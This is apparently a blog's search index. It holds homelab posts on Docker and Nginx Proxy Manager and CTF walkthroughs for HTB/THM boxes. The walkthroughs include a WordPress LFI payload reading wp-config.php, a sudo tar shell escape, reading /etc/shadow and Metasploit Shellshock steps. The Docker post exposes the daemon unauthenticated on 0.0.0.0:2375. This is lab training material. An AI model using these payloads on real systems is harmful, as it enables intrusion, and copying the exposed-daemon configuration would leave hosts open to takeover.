 icon: \"fab fa-reddit\"    url: \"https://www.reddit.com/user/\"    target: \"_blank\"  - name: \"Twitter\"    icon: \"fab fa-twitter\"    url: \"https://twitter.com/home\"    target: \"_blank\"  - name: \"Facebook\"    icon: \"fab fa-facebook\"    url: \"https://www.facebook.com\"    target: \"_blank\"  - name: \"Work Dashboard (local)\"    icon: \"fas fa-tools\"    url: \"https://wordpress.com\"    target: \"_blank\"# Servicesservices:    # Section 1  - name: \"Hardware\"    icon: \"fas fa-server\"    items:      - name: \"Proxmox\"        logo: \"https://raw.githubusercontent.com/walkxcode/dashboard-icons/master/png/proxmox.png\"        subtitle: \"Virtual Environment\"        tag: \"server\"        tagstyle: \"is-link\" # options is-primary,is-link,is-info,is-success,is-warning,is-danger,is-small,is-medium,is-large,is-outlined,is-loading,[disabled]        url: \"https://proxmox.com\"        target: \"_blank\"      - name: \"servers\"        subtitle: \"Power edge Dell R720\"        logo: \"https://www.freepnglogos.com/uploads/server-png/home-server-icon-icons-and-png-backgrounds-30.png\"        tag: \"Server\"        tagstyle: \"is-link\"        url: \"https://www.dell.com/\"        target: \"_blank\"  # Section 2  - name: \"Container Management ARM\"    icon: \"fab fa-docker\"    items:      - name: \"Portainer\"        logo: \"https://raw.githubusercontent.com/walkxcode/dashboard-icons/master/png/portainer.png\"        url: \"https://www.portainer.io/\"        type: \"Portainer\"        target: \"_blank\"  # Section 3  - name: \"Applications\"    icon: \"fas fa-gears\"    items:            - name: \"Nginx Proxy Manager\"        subtitle: \"Reverse Proxy Service\"        logo: \"https://raw.githubusercontent.com/walkxcode/dashboard-icons/master/png/nginx-proxy-manager.png\"        tag: \"proxy\"        tagstyle: \"is-link\"        url: \"https://nginxproxymanager.com/\"        target: \"_blank\"      - name: \"Bitwarden\"        subtitle: \"Password Management\"        logo: \"https://raw.githubusercontent.com/walkxcode/dashboard-icons/master/png/bitwarden.png\"        tag: \"app\"        tagstyle: \"is-link\"        url: \"https://bitwarden.com/\"        target: \"_blank\"Custom ThemesYou can add custom CSS to homer in order to have a personal look similar to the one I have used from Walkxcode called homer-theme  For More details please check the manual"
  },
  
  {
    "title": "Npm",
    "url": "/posts/npm/",
    "categories": "Docker",
    "tags": "",
    "date": "2023-01-19 00:00:00 +0530",
    





    
    "snippet": "The Nginx Proxy Manager (NPM) is an open-source reverse proxy management system that runs as a Docker container. It is easy to set up and requires no expertise to work with Nginx servers or SSL cer...",
    "content": "The Nginx Proxy Manager (NPM) is an open-source reverse proxy management system that runs as a Docker container. It is easy to set up and requires no expertise to work with Nginx servers or SSL certificates. All you need to do is install a Docker and Docker Compose on each server.Prerequisites  Docker Engine and Docker Compose packages are installed and running  A non-root user with Docker privileges  A valid domain name for Nginx Proxy Manager (example.your-domain.tld in this tutorial).Setting up the Nginx proxy managerCreate the directory structuremkdir -p ~/docker/npm/{data,letsencrypt,data/snippet}touch ~/docker/npm/data/snippet/_hsts.confNext, let’s create a docker-compose.yml file to define different services to deploy Nginx Proxy Manager you can use the yaml files depending upon your requirements.nano docker-compose.ymlversion: \"3\"services:  app:    image: 'jc21/nginx-proxy-manager:latest'    restart: unless-stopped    ports:      - '80:80'      - '443:443'      - '81:81'    environment:      DB_MYSQL_HOST: \"db\"      DB_MYSQL_PORT: 3306      DB_MYSQL_USER: \"$secure-user\"      DB_MYSQL_PASSWORD: \"$secure-password\"      DB_MYSQL_NAME: \"$database\"    volumes:      - ./data:/data      - ./letsencrypt:/etc/letsencrypt      - ./data/snippet/_hsts.conf:/app/templates/_hsts.conf## Optional#    depends_on:#      - db##  db:#    image: 'jc21/mariadb-aria:latest'#    restart: unless-stopped#    environment:#      MYSQL_ROOT_PASSWORD: '$secure-password'#      MYSQL_DATABASE: '$database'#      MYSQL_USER: '$secure-user'#      MYSQL_PASSWORD: '$secure-password'#    volumes:#      - ./data/mysql:/var/lib/mysqlStarting the containerDocker Compose allows us to start all the services we specified in the docker-compose.yml file with just one command: docker-compose up.Let’s start all the containers and make them run in the background using the -d flag:docker-compose up -dTo verify the status of all running containers, run the docker-compose ps command:docker-compose ps (OR) docker ps -aIf something goes wrong, you can check the logs for each container using the docker logs command and specify the service name. For example, to check the log of the Nginx Proxy Manager container, run the following command:docker logs $container (OR) docker compose logs -fConfiguring the headersFeel free to update the headers according to your specific needs and include them in the nginx proxy vhost while configuringnano ./data/snippet/_hsts.conf{% if certificate and certificate_id &gt; 0 -%}{% if ssl_forced == 1 or ssl_forced == true %}{% if hsts_enabled == 1 or hsts_enabled == true %}  # HSTS (ngx_http_headers_module is required) (63072000 seconds = 2 years)  add_header Strict-Transport-Security \"max-age=63072000;{% if hsts_subdomains == 1 or hsts_subdomains == true -%} includeSubDomains;{% endif %} preload\" always;  add_header Referrer-Policy strict-origin-when-cross-origin;  add_header X-Content-Type-Options nosniff;  add_header X-XSS-Protection \"1; mode=block\";  add_header X-Frame-Options SAMEORIGIN;  add_header \"Access-Control-Allow-Origin *;\";  add_header Content-Security-Policy upgrade-insecure-requests;  add_header Permissions-Policy interest-cohort=();  add_header Expect-CT 'enforce; max-age=604800';  more_set_headers 'Server: Proxy';  more_clear_headers 'X-Powered-By';{% endif %}{% endif %}{% endif %}  For More details please check the manual"
  },
  
  {
    "title": "Docker",
    "url": "/posts/docker/",
    "categories": "Docker",
    "tags": "",
    "date": "2023-01-15 00:00:00 +0530",
    





    
    "snippet": "  Docker installation various depends upon the distribution you use check docker manualInstalling Docker Engine on Debian 11To install Docker on Debian 11, follow these steps:Update a Package ListM...",
    "content": "  Docker installation various depends upon the distribution you use check docker manualInstalling Docker Engine on Debian 11To install Docker on Debian 11, follow these steps:Update a Package ListMake sure your package list is up to date by opening a terminal and running the following command.sudo apt updateInstall Required PackagesInstall the required packages to enable apt to use HTTPS repositories and support other package types.sudo apt install apt-transport-https ca-certificates curl software-properties-commonAdd Docker RepositoryYou can add Docker’s official GPG key and repository to your system by following these steps.curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpgecho \"deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/nullUpdate Package List AgainPlease run the update command again to ensure that the Docker repository is included.sudo apt updateInstall Docker EngineInstall Docker Engine and its dependencies.  If you want to keep all the libraries in home directory create the symlink as follows mkdir /home/.docker/ &amp;&amp; ln -s /home/.docker/ /var/lib/dockersudo apt install docker-ce docker-ce-cli containerd.io  If you would like to use the docker compose plugin please add docker-compose-pluginStart and Enable DockerStart the Docker service and enable it to start on boot. First run the command:sudo systemctl start dockerTo automatically launch alongside the operating system, include it in the startup configuration with this command.sudo systemctl enable dockerVerify InstallationTo ensure that Docker is up and running, try running a basic container with a “Hello World” command.sudo docker run hello-worldCongratulations! You have successfully installed Docker on Debian 11. Get ready to efficiently manage and run containers for your applications.Enable TCP port 2375 for external connection to DockerUpdate the systemd configurationLocate the docker daemon service file in my case /lib/systemd/system/docker.service❯ systemctl status docker● docker.service - Docker Application Container Engine     Loaded: loaded (/lib/systemd/system/docker.service; enabled; preset: enabled)    Drop-In: /usr/lib/systemd/system/docker.service.d             └─dietpi-simple.conf     Active: active (running) since Wed 2024-03-27 23:10:33 IST; 1 week 2 days agoTriggeredBy: ● docker.socket       Docs: https://docs.docker.com   Main PID: 1451697 (dockerd)      Tasks: 67     Memory: 48.3M        CPU: 1h 13min 47.364s     CGroup: /system.slice/docker.servicelocate the ExecStart and update the tcp lisen port as followsExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H=fd:// -H=tcp://0.0.0.0:2375Reload the systemd daemon:systemctl daemon-reloadRestart docker: systemctl restart docker.serviceVerify TCP portYou can verify if the docker is lisening on the port 2375❯ ss -lntp | grep 2375LISTEN 0      4096               *:2375             *:*    users:((\"dockerd\",pid=1451697,fd=3))Manage Docker as a non-root user  The docker group grants root-level privileges to the user. For details on how this impacts security in your system, see Docker Daemon Attack Surface.Create the docker group and add your user:sudo groupadd dockerAdd your user to the docker group.sudo usermod -aG docker $USERLog out and log back in so that your group membership is re-evaluated.  If you’re running Linux in a virtual machine, it may be necessary to restart the virtual machine for changes to take effect.You can also run the following command to activate the changes to groups:newgrp dockerVerify that you can run docker commands without sudo.docker run hello-world"
  },
  
  {
    "title": "Forge",
    "url": "/posts/forge/",
    "categories": "CTF, HTB",
    "tags": "ftp, ssh",
    "date": "2023-01-12 00:00:00 +0530",
    





    
    "snippet": "IntroductionToday we will learn about the server-side request forgery attack. While enumerating, we discovered the FTP credentials through which we gain access to the server via ssh and the root us...",
    "content": "IntroductionToday we will learn about the server-side request forgery attack. While enumerating, we discovered the FTP credentials through which we gain access to the server via ssh and the root using the Python library. With that stated, let’s get started.As is customary, we will begin by scanning the server for open ports using the nmap.We only have two open ports: SSH (OpenSSH) and Apache (for the webpage). Let’s examine the web server.We have a standard website with an image upload option. We can upload images in two ways: one from a local computer and the other from a URL.To receive the request from the server to our local system, I had setup the Python server from scratch. So we can be sure the server is sending us the request.EnumerationWhile the web server is operating, let’s use the sec list wordlist to run the gobuster for directory listing.However, we just have the uploads directory, which redirects /uploads to /upload, and I didn’t find much in the directory, so I began the DNS enumeration using the wordlist present in seclist itself.I discovered another subdomain admin, however it was only accessible via localhost.However, we can send the request from the server to our localhost and then redirect the web server to the admin page.Let me describe the situation. We use the upload function to send the request to our localhost, from which we redirect the web server to the restricted admin panel. Let us try…We received the request from the remote server, which was fulfilled by my scratch python web server, and we received success and an address to view our files.Let’s open this URL in a browser, however I didn’t get a response from the server when I tried to curl the same address, but I can see the content of the admin section.Ftp accessI located the FTP credentials.I am unable to access the FTP port since it has been filtered.Considering that we have URL redirection, let us redirect the web server to the FTP server to review the content.As we can access the files, let us copy the user’s private ssh keys in order to login via SSH, as the ssh port was open.We have the ssh user’s private key, which we store to a file and use to login to the server through ssh.Escalating PrivilegesLet’s look at the user’s permissions. We can execute /opt/remote-manage.py. Because this script expected numbers as input, let’s cause an error by pressing the random key, which takes us to the Python debugger ( PDB ). We can acquire root access via the PDB."
  },
  
  {
    "title": "All in one",
    "url": "/posts/allinone/",
    "categories": "CTF, THM",
    "tags": "cyberchef, find, socat, sudi binary, wpscan",
    "date": "2022-05-18 00:00:00 +0530",
    





    
    "snippet": "This is a fun box where we can find many ways where we can exploit let’s see how we can get the root into it let’s beginReconnaissanceThis phase involves gathering information about the target syst...",
    "content": "This is a fun box where we can find many ways where we can exploit let’s see how we can get the root into it let’s beginReconnaissanceThis phase involves gathering information about the target system to understand its vulnerabilities and potential entry points. Tools like Nmap are used to scan for open ports and services running on those ports. Gobuster is utilized to search for web directories, while Nikto helps in identifying common vulnerabilities in web servers. This step helps the attacker understand the target’s attack surface and plan their approach accordingly.As we always do let’s start scanning the box for the open ports with Nmap gobuster for web directories and Nikto for common vulnerabilityBy looking at the results we there are three ports open FTP SSH and APACHE web server. We can also see that anonymous ftp logins are allowed let’s hope into FTP to find what’s present in itIt seems to be the FTP is currently empty let’s check for the APACHE web server we ALL IN ONE page of WordPress it was also identified by the gobusterLets check the front end of the WordPress to figure out which themes/modules it usedENUMERATINGLet’s start WordPress scanner and ENUMERATE users to find the usernames for login into the WordPress to gain the accessWe got the username and need to escalate the password for login this we can do by using a vulnerability plugin installed in the WordPress which contains The File Inclusion vulnerability ( LFI ) allows an attacker to include a filehttp://ip/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.phpWe are using PHP filters for converting the code into the base64 format and by decrypting it we can able to see the code clearly in plain textWe can use the cyber chef for decrypting it is one of my favorite fools for encryption, encoding, compression, and data analysis.As It was the easy box we have the found credentials for the database user and the same credentials has been used for the WordPress loginWordPressLet’s hope in into the WordPress by using the credentials and get a quick reverse shell from itAm using custom plugin for getting the reverse shell.Navigate into the home directory we have a hint here saying that the password is saved in the box we need to find themFindAm using find followed by the user and type as a file, am going to scan the root directory (/) by sending an error message to nullRoot AccessWe got the credentials let’s escalate the user to root by knowing what permissions have been given to the user. We can use socat It can be used to break out from restricted environments by spawning an interactive system shell. Let’s break the restricted shell and BOOM we are ROOT"
  },
  
  {
    "title": "Chill Hack",
    "url": "/posts/chillhack/",
    "categories": "CTF, THM",
    "tags": "Pwncat, zip, john",
    "date": "2021-12-15 00:00:00 +0530",
    





    
    "snippet": "ReconnaissanceLet’s do  a quick reconnaissance to find the information about the box by doing a nmap scan to find the open portsAs we have ftp port open by seeing at the namp results we have anonym...",
    "content": "ReconnaissanceLet’s do  a quick reconnaissance to find the information about the box by doing a nmap scan to find the open portsAs we have ftp port open by seeing at the namp results we have anonymous login allowed lets login as anonymousWe have a successful login and we have a note.txt hear download it with get it and cat it out as we have usernames hear and nothing much. Let’s have a look at the port 80we have a static web page. run the gobuster and nikto to find the directories present in it                               By looking at the gobuster and nikto results /secrets seems to be interesting open the /secrets page we have commands execution hear run the ls to check the files present in it                               we have an error when we executed the ls command we have to bypass the filter to get the command execution. send the request to the brup and so that we can easily modify the requestfilter’s bypassLets fire up the burp suite and catch the request so that we can play around itwe have a 200 response that means we have successfully bypassed the filters lets cat the index file to see the filters present in it so that we can get the reverse shellthe filter seems to block the tools like python bash php perl rm cat head tail python3 more less sh and ls commands that’s why when we executed the ls command we get an error. Since we cannot execute the shell scripts we can by pass this filters by creating an exploit in our local meacine start the simple http server and curl the exploit and send it to the bash to get the reverse shell. bash is also get blocked due to filter we can bypass it by send bash and the it wont get stopped by filerGetting an shelllets create the exploit to get the reverse shell connection                               stat the listener service when the code get executed it should give us a no response seems to be interesting lets look at the listener service we have a reverse shell as www-datalets check what permission we have as a www-data user and we can run the helpline script and we logged in as another  user we can conform it by seeing at the id outputSSH Keyslets create a ssh key and upload it in the user authorized_keys so that we can ssh into the boxWe have a successful login to ssh and by doing some basic enumeration we came to know that another port is listen 9001. forward the port locally and locate it at https://localhost:9001bypassing loginWe don’t have the credentials to login. lets save the request to a file and run the sqlmap to find the bypass payload to login we have bypassed it with this payload and we have a login                               Steganographywe have only some text on the page look in the dark! you will find your answer.  and we have a image lets wget it to download it and use steghide to see any information is hidden in itJohnwe have find that some information is hidden in it we need to have the credentials to extract it from the jpg file am using joh tool to extract the information from it. first we have to use zip to john tool against the backup.zip file ehich was extracted from the jgp file and save the output hash to a file and run the john tool against the hash to get the passpharse to extract the information from the backup.zipPrivilege escalationrun the id command by looking at it we came to know that we are in a DOCKER container and If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.That’s it for today hope you like the box subscribe for more updated content fell free to drop a comment  and HAVE A GREAT DAY !"
  },
  
  {
    "title": "Brute Force",
    "url": "/posts/bruteforce/",
    "categories": "CTF, THM",
    "tags": "hydra, john",
    "date": "2021-11-17 00:00:00 +0530",
    





    
    "snippet": "Reconnaissancelet’s do the quick scanning to find the open ports on the boxnmap -sc -sV -oN file_name ipnmap -SC for default cripts aand -sV for enumerate version -oN for simple nmap format and the...",
    "content": "Reconnaissancelet’s do the quick scanning to find the open ports on the boxnmap -sc -sV -oN file_name ipnmap -SC for default cripts aand -sV for enumerate version -oN for simple nmap format and the ip address you want to scan there are two ports open one is being SSH and the other is web server HTTP, ssh is running on version openssh 7.6 and the apache 2.4.29. As the web server is open scan for the directories present in it with the gobustergobuster dir -u url -w wordlist -o outputgobuster dir for specifying the gobuster in directory mode and -u for the URL you want to scan and the -o for output the scanning resultswe have got the results /admin login  page lets check the pageHydrahydra – Very fast network logon crackerHydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.Hydra is a tool to guess/crack valid login/password pairs – usage only allowed for legal purposes.we are going to brute force the admin panel to gain the access into the boxwe found the admin credentials by brute forcing the admin panel with the rockyou wordlist, login with the credentials into the admin paneljohnfirst  run the ssh2john python script for the rsa private key and save the output format to a file. then run the run the john on the output file to start the john you can use custom wordlist if you want or the you can use the custom wordlist which came along with the john the ripplewe got the password of the rsa private key and we have the ssh port open lets login into the SSH. we got logged in into the box and we have successfully logged inEnumerationif we check the permission of the user we can run the cat as sudo, If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. sudo cat /etc/shadowwe got the hash of the root user, let’s crack it with the john. first save the hash to a file and sun the john tool in this case am not using any wordlist just providing the ash to the john to crack itwe got the root credentialsthat’s all for today hope you like the box, have a GREAT DAY."
  },
  
  {
    "title": "Root Me",
    "url": "/posts/rootme/",
    "categories": "CTF, THM",
    "tags": "Lfi, pwncat",
    "date": "2021-11-10 00:00:00 +0530",
    





    
    "snippet": "This is a easy box we start with file upload vulnerabilityReconnaissanceLet’s do  a quick reconnaissance to find the information about the box by doing a nmap scan to find the open portswe have two...",
    "content": "This is a easy box we start with file upload vulnerabilityReconnaissanceLet’s do  a quick reconnaissance to find the information about the box by doing a nmap scan to find the open portswe have two ports open one is SSH running on openssh 7.6  version and the other is the web server running on the Apache httpd 2.4. As the web server is open lets run the gobuster and the nikto to find the directories and the vulnerability present in the web server                               by looking at both the results gobuster seems to be interesting it had found the /upload and /panel directory.Enumerationlet’s upload the reverse shell and start the listener server on the local host to gain access into the server as the www-data userEnumerationby running some enumeration on the setuid binaries we may able to know that we can gain the root access by using the python"
  },
  
  {
    "title": "Jeff",
    "url": "/posts/jeff/",
    "categories": "CTF, THM",
    "tags": "fcrackzip, wpscan",
    "date": "2021-10-30 00:00:00 +0530",
    





    
    "snippet": "scanningLet’s scan the host to find the open ports with nmap, nikto and gobuster                               Looking at the results we have two ports open one is being SSH and HTTP. the gobuster ...",
    "content": "scanningLet’s scan the host to find the open ports with nmap, nikto and gobuster                               Looking at the results we have two ports open one is being SSH and HTTP. the gobuster and nikto both find the /admin pannel to login and the gobuster had find the /backup which seems to be interesting, let’s start another gobuster to scan the backup directory to find content present in the backup with the extensions as zip, txt, gzipit looks like we have backup.zip file in the backup directory. lets download it with the wgetwgetWget is a free utility for non-interactive download of files from the Web. It supports HTTP, HTTPS, and FTP protocols, as well asretrieval through HTTP proxies.unzip it but we failed. it was protected by a password. we don’t have any password to unzip it let’s try to crack it with the fcrackzipfcrackzipWe frequently use zipped files due to its small size and encryption algorithm. These zipped files come with a facility of password protection which maintains the security of the files. When u have lost the password, and the problem arises of how to crack it, fcrackzip comes to the rescue to save and provide you with the way out in order to protect your documents. Simple way to crack a protected zip file with the help of fcrackzip which is available under Linux. fcrackzip is a free/fast zip password cracker                               we got the password lets unzip it and we have the password to login but we don’t have any valid user name to loginwp scanLets scan the WordPress site with the WordPress scanners to find the informationwith the wpscan we can able to find the username. let’s login with that credentials to WordPressexploitlet’s create an WordPress plugin to give us a reverse shell, upload the plugin and install it                               we got the shell as the www-data we have nothing to do with that low level user privileges.but a little bit of enumeration we found that there is a ftp_backup.phpwe have ftp backup user credentials. but we cannot switch the user to backup but we can upload a reverse shell and run it to gain access to the backup user                               We can use netcat to start the listening service but am using the pwncat to listen and i got the shell as a backup user. and run the find command to run the files owned by the user find ~/ -type d -exec ls.1 -d {} \\; 2&gt;/dev/nullit looks like we have systools to run let’s run it and restore the password of the user for valid credentialssshIn the nmap results we had seen that there is an SSH port is open, lets ssh into the box with this credentialswe got into the box but we are in a restricted shell but we need to break out from restricted environments by spawning an interactive system shell to get the commands executedThat’s all for today guys hope you like the box. HAVE A GREAT DAY"
  },
  
  {
    "title": "Shell Shock",
    "url": "/posts/shellshock/",
    "categories": "CTF, THM",
    "tags": "john, metasploit",
    "date": "2021-10-15 00:00:00 +0530",
    





    
    "snippet": "what is shell shock vulnerabilityShellshock is a security bug causing Bash to execute commands from environment variables unintentionally. In other words if exploited the vulnerability allows the a...",
    "content": "what is shell shock vulnerabilityShellshock is a security bug causing Bash to execute commands from environment variables unintentionally. In other words if exploited the vulnerability allows the attacker to remotely issue commands on the server, also known as remote code execution. Even though Bash is not an internet-facing service, many internet and network services such as web servers use environment variables to communicate with the server’s operating system.Since the environment variables are not sanitized properly by Bash before being executed, the attacker can send commands to the server through HTTP requests and get them executed by the web server operating system.ScanningLet’s scan with the nmap to find the open services on the boxnmap -sC default scripts -sV enumerate version -oN output out format ipWe have two services open one is being SSH and the other is HTTP. As the web server is open let’s fire up the gobuster to find the directories and the nikto to find vulnerabilities and mis-configurations on the server.gobuster dir -u url -w wordlist -x extensions -o output nikto -h url                               looking at the gobuster results it seems to be /backup is interesting. Let’s check what is present in the backup directoryJohn The RipperJohn the Ripper is a fast password cracker Its primary purpose is to detect weak Unix passwords we can crack the private key with the john for this we need to run the script to change the private key for john compatibilityssh2john.py ssh/privatekey &gt; output.txtRun the john against the private key and we have a password of an private key. let’s login with the private key but we couldn’t login because we didn’t have the user passwordLet’s see what we can do with it, looking at the nikto results /cgi-bin/test.cgi seems to be vulnerability with the shell shock vulnerability. It’s time to start the metasploit frameworkMetasploit FrameworkWe are using the metasploit framework use the exploitmsf &gt; use exploit/multi/http/apache_mod_cgi_bash_env_execmsf &gt; exploit(apache_mod_cgi_bash_env_exec) &gt; set TARGET &lt; target-id &gt;msf &gt; exploit(apache_mod_cgi_bash_env_exec) &gt; show options    ...show and set options...msf exploit(apache_mod_cgi_bash_env_exec) &gt; run0day_8Ones we run it we have a meterpreter shell opened as a low level userPrivilege EscalationLets upload the linpeas to escalate the privilegesby looking at the results we can say that the Linux version is too old we can exploit it using the CVE-2015-1328CVE-2015-1328Description The overlayfs implementation in the Linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace.upload the exploit and run itWe are root now ! HOPE YOU LIKE THE BOX HAVE A GOOD DAY"
  },
  
  {
    "title": "Wordpress",
    "url": "/posts/wordpress/",
    "categories": "CTF, THM",
    "tags": "streghide, wpscan, metasploit, find",
    "date": "2021-09-16 00:00:00 +0530",
    





    
    "snippet": "scanningLet’s scan the host to find the open portsWe have three services open one is being an SSH HTTP &amp; SMB  let’s check the web servernothing much interesting hear. we have a billy as the use...",
    "content": "scanningLet’s scan the host to find the open portsWe have three services open one is being an SSH HTTP &amp; SMB  let’s check the web servernothing much interesting hear. we have a billy as the user let’s check the samba share with this user nameAs the share contains only three two jpg files and one mp4. Download it locally and check whether the jpg files contains any data inside it with streghidestreghideSteghide is a steganography program that is able to hide data in various kinds of image- and audio-files. The color- respectivly sample-frequencies are not changed thus making the embedding resistant against first-order statistical tests.Steganography literally means covered writing. Its goal is to hide the fact that communication is taking place. This is often achieved by using a (rather large) cover file and embedding the (rather short) secret message into this file. The result is a innocuous looking file (the stego file) that contains the secret message.wpscanWPScan is an open source WordPress security scanner. You can use it to scan your WordPress website for known vulnerabilities within the WordPress core, as well as popular WordPress plugins and themes.Since it is a WordPress black box scanner, it mimics a real attacker. This means it does not rely on any sort of access to your WordPress dashboard or source code to conduct the tests. In other words, if WPScan can find a vulnerability in your WordPress website, so can an attacker.WPScan uses the vulnerability database called wpvulndb.com to check the target for known vulnerabilities. The team which develops WPScan maintains this database. It has an ever-growing list of WordPress core, plugins and themes vulnerabilities.With the help of the wpscan we can got the users names and we dont have a valid password to login let’s bruteforce to find the valid passwordBrute ForceWe have a valid username and password login with that creds into the wordpressWordPress Crop-image Shell UploadAs the above WordPress version is 5.0 we have WordPress Crop-image Shell Upload vulnerability present in this version. This exploits a path traversal and a local file inclusion vulnerability on WordPress versions 5.0.0 and &lt;= 4.9.8.The crop-image function allows a user, with at least author privileges, to resize an image and perform a path traversal by changing the _wp_attached_file reference during the upload.The second part of the exploit will include this image in the current theme by changing the _wp_page_template attribute when creating a post. This exploit module only works for Unix-based systems currently.metasploitLet’s fire up the metasploit framework and run the crop image exploit by setting the WordPress login credentials. if you don’t have metasploit framework you can install it by using this single command in your terminalcurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstallone’s you set all the requirements run it and we have a meterpreter shell opened as a low level userEnumerationwith the help of find command lets check the enumerate of all binaries having SUID permission. find / -perm -u=s -type f 2&gt;/dev/nullThe /usr/sbin/checker file seems to be interesting and all the  other files are quite common. let’s trace the checker with ltrace and we export admin = 1 and we have a nice root shell hearThat’s all for to day hope you like the box. HAVE A GREAT DAY"
  },
  
  {
    "title": "Peak",
    "url": "/posts/peakhill/",
    "categories": "CTF, THM",
    "tags": "cyberchef, pyc",
    "date": "2021-09-07 00:00:00 +0530",
    





    
    "snippet": "As usual we begin with the scanning the box with the nmap, rust to find the open ports and we found the anonymous ftp login through winch we get the credentials in a binary format by using the cybe...",
    "content": "As usual we begin with the scanning the box with the nmap, rust to find the open ports and we found the anonymous ftp login through winch we get the credentials in a binary format by using the cyber chef get the login credentials though which we connect via ssh with all being said let jump into the boxscanningLet’s scan the box to find the open port’s                               As we have two service’s open one is being SSH  and the other is FTP. As the nmap scan results ANONYMOUS login’s are allowed let’s check the ftpAs we have .creds and the test.txt files get this files and exit from ftp. As we have a binary code in .creds let’s decode it with the cyberchefAfter decoding it you will find a SSH user name and password login with that user &amp; passwordWe have a successful login and we are into the box with low level user and we have nothing to do from hear except we have a cmd_service.pyc file. Let’s download the file with the Secure copy protocol (scp) followed by the user name IP and location of file to copyscp user@ip:location/of/file.pyc.pyc files are created by the Python interpreter when a .py file is imported. They contain the “compiled bytecode” of the imported module/program so that the “translation” from source code to bytecode (which only needs to be done once) can be skipped on subsequent imports if the .pyc is newer than the corresponding .py file, thus speeding startup a little. But it’s still interpreted.Once the *.pyc file is generated, there is no need of *.py file, unless you edit it. But we can’t able to read the bytecode we have convert the bytecode into the .py script. For this we need a tool called uncompile6 install it and run it you will get the python codeuncompyle6 cmd_service.pyc &gt; code.pyWe can also find that the code is starting the server on local at port 7321 and credentials to login. Let’s connect it with the NETCAT. Copy the private key of the userSave it to a file and change the permission of the id_rsa and SSH with that with the private keyif we check the permissions of the user we may only run the peak_hil_farm as a ROOT user with out the passwordlet’s create a pickle exploit to give us the setuid binarySet User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges.Hope you like the box, HAVE A GREAT DAY"
  },
  
  {
    "title": "Peak",
    "url": "/posts/jboss/",
    "categories": "CTF, THM",
    "tags": "gtfo bin, jexboss",
    "date": "2021-08-08 00:00:00 +0530",
    





    
    "snippet": "This is a fun and easy box with a lot of open ports to explore in many ways. will start with the nmap as usual check the site explore the vulnerability get the reverse shell with netcat and escalat...",
    "content": "This is a fun and easy box with a lot of open ports to explore in many ways. will start with the nmap as usual check the site explore the vulnerability get the reverse shell with netcat and escalate the privileges with the pingsys suid binary with all being said let jump into the box.let scan the box to find the open ports with the nmapBy looking at the nmap results we have a bunch of open ports. Open ssh with version 7.4 Apache listening on two ports 80. the jboss on port 8080.Lets explore the jobssAs this application is build with jboss we have a tool called Jexboss which is used for testing and exploiting vulnerabilities in JBoss Application Server and others Java PlatformsUpon running the jexboss scan we have found the vulnerability and and got the shell as Jacob userAs we have the shell let get the reverse shell connection via netcat to escalate the privilegeswe are in the box as the Jacob user and run the following command, you can list all binaries with SUID permission.the pingsys command to perform a presence check (ping) on the targeted systems. When the presence check is completed, the results are reflected in the OperatingState and CommunicationState attributes.Through the pingsys command we can get the ROOT user here,  it will ping the localhost (127.0.0.1). then it executes the /bin/sh through winch we got the root shell"
  },
  
  {
    "title": "Hacker",
    "url": "/posts/hacker/",
    "categories": "CTF, THM",
    "tags": "crackmap, suid",
    "date": "2021-07-23 00:00:00 +0530",
    





    
    "snippet": "As usual we will start with the nmap scan and we notice ftp anonymous login allows and we found two files there will get these files and use the crack map exec to find the credentials once we are i...",
    "content": "As usual we will start with the nmap scan and we notice ftp anonymous login allows and we found two files there will get these files and use the crack map exec to find the credentials once we are into the box by using the tar suid we will escalate the root privileges with all being said let beginLets scan the box with the nmap nmap -sC -sV -oN ipWe some open port’s FTP ( 21 ), SSH ( 22 ), HTTP ( 80 ) we can see that the anonymous ftp login’s are allowed let’s login as anonymousWe got the user name from tasks.txt let’s see whats on port HTTP 80 nothing find’s interesting. let’s start the gobuster to discover the directories gobuster dir -u (url) -w (wordlist) -o (outputfile)As we have a valid user name let’s try to validate credentials with crack mapcrackmap exec ssh ip -u user -p passlistAs we have a valid credentials let’s ssh into the boxwe have a successful login. let’s check what permissions we have sudo -l the root user may run the /bin/tarlets escalate to root user by using the tar sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/shThat’s all for today hope you like the box! HAVE A GREAT  DAY"
  },
  
  {
    "title": "Active Directory",
    "url": "/posts/activedirectry/",
    "categories": "CTF, THM",
    "tags": "impacket, kerbrute, psexec",
    "date": "2021-07-09 00:00:00 +0530",
    





    
    "snippet": "Most of the Corporate networks run off of AD. We are going to exploit a DOMAIN CONTROLLER. With the kerbrute and impacket tools to enumerate the box .  Let’s scan for the open ports with the nmap  ...",
